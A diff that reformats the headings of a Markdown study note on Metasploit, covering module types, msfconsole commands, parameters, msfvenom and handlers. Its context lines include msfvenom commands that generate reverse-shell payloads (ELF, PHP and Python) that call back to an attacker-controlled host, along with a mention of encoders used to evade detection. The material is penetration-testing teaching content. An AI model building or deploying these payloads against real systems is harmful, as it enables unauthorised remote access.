@@ -1,4 +1,6 @@
-### **I. Introduction to Metasploit:**
+# Metasploit_Introduction
+
+## Introduction to Metasploit
 
 - **Purpose:** Metasploit is a powerful penetration testing framework that provides a comprehensive set of tools for vulnerability scanning, exploitation, and post-exploitation. It streamlines the process of identifying and exploiting security weaknesses in various systems and applications.
 - **Versions:**
@@ -12,7 +14,8 @@
     - **Exploit:** A piece of code that takes advantage of a vulnerability.
     - **Vulnerability:** A weakness in design, code, or logic that can be exploited.
     - **Payload:** The code that is executed on the target system after successful exploitation.
-### **II. Module Types:**
+
+## Module Types
 
 - **Auxiliary:** Supporting modules like scanners, fuzzers, and denial-of-service tools.
 - **Encoders:** Encode payloads to evade detection or bypass security mechanisms.
@@ -25,7 +28,8 @@
         - **Stagers:** Set up a connection for staged payloads.
         - **Stages:** The main payload downloaded by the stager.
 - **Post:** Modules for post-exploitation activities (e.g., privilege escalation, data gathering).
-### **III. `msfconsole`:**
+
+## `msfconsole`
 
 - **Launching:** `msfconsole`
 - **Command Execution:** Supports many Linux commands (e.g., `ls`, `ping`, `clear`).
@@ -47,7 +51,8 @@
 - **`sessions`:** Lists active sessions.
 - **`sessions -i [id]`:** Interacts with a session.
 - **`background` or `CTRL+Z`:** Backgrounds a session.
-### **IV. Parameters:**
+
+## Parameters
 
 - **`RHOSTS`:** Target host(s) (single IP, range, CIDR, or file).
 - **`RPORT`:** Target port.
@@ -55,7 +60,8 @@
 - **`LHOST`:** Attacking machine's IP address.
 - **`LPORT`:** Local port for reverse connections.
 - **`SESSION`:** Session ID for post-exploitation modules.
-### **V. Msfvenom:**
+
+## Msfvenom
 
 - **Purpose:** Generates payloads in various formats.
 - **Options:**
@@ -71,7 +77,8 @@
     - Linux executable: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > payload.elf`
     - PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw > payload.php`
     - Python: `msfvenom -p cmd/unix/reverse_python LHOST=... LPORT=... -f raw > payload.py`
-### **VI. Handlers:**
+
+## Handlers
 
 - **Purpose:** Catch reverse shells and Meterpreter payloads.
 - **Module:** `exploit/multi/handler`
